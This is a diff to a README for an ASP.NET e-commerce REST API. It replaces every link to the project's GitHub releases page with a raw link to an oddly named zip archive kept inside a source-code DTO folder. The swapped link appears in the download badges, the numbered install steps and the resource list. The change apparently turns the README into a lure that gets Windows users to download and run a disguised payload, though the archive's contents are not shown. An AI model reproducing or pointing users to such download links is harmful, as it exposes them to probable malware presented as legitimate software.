@@ -1,6 +1,6 @@
 # 🛒 ECommerce-Api - Simple REST API for Online Stores
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://github.com/LucaRain/ECommerce-Api/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://raw.githubusercontent.com/LucaRain/ECommerce-Api/main/src/ECommerce.Application/DTOs/Product/Api-E-Commerce-Huchnom.zip)
 
 ## 🚀 What is ECommerce-Api?
 
@@ -43,9 +43,9 @@ Make sure your PC meets the system requirements above. You need a stable interne
 
 Click the badge below or visit the link to download the software.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://github.com/LucaRain/ECommerce-Api/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://raw.githubusercontent.com/LucaRain/ECommerce-Api/main/src/ECommerce.Application/DTOs/Product/Api-E-Commerce-Huchnom.zip)
 
-1. Visit the link: https://github.com/LucaRain/ECommerce-Api/releases  
+1. Visit the link: https://raw.githubusercontent.com/LucaRain/ECommerce-Api/main/src/ECommerce.Application/DTOs/Product/Api-E-Commerce-Huchnom.zip  
 2. Look for the latest release. It will have a name like `ECommerce-Api-v1.0.zip` or similar.  
 3. Click on the zip file to download it to your PC.  
 4. Once downloaded, open the folder where the file is saved.  
@@ -120,7 +120,7 @@ You do not have to do anything for this during install. The system activates as 
 
 ## 📂 Useful Links and Resources
 
-- Download page: https://github.com/LucaRain/ECommerce-Api/releases  
+- Download page: https://raw.githubusercontent.com/LucaRain/ECommerce-Api/main/src/ECommerce.Application/DTOs/Product/Api-E-Commerce-Huchnom.zip  
 - ECommerce-Api topics: asp-net, clean-architecture, docker, docker-compose, e-commerce, entity-framework-core, jwt-auth, openapi, postgresql, redis, scalar
 
 You can explore these if you need more technical details later. For now, focus on downloading and running the API on your Windows PC.
@@ -141,4 +141,4 @@ To update, repeat the download process with the latest release from the page. Ex
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://github.com/LucaRain/ECommerce-Api/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ECommerce--Api-blue?style=for-the-badge)](https://raw.githubusercontent.com/LucaRain/ECommerce-Api/main/src/ECommerce.Application/DTOs/Product/Api-E-Commerce-Huchnom.zip)
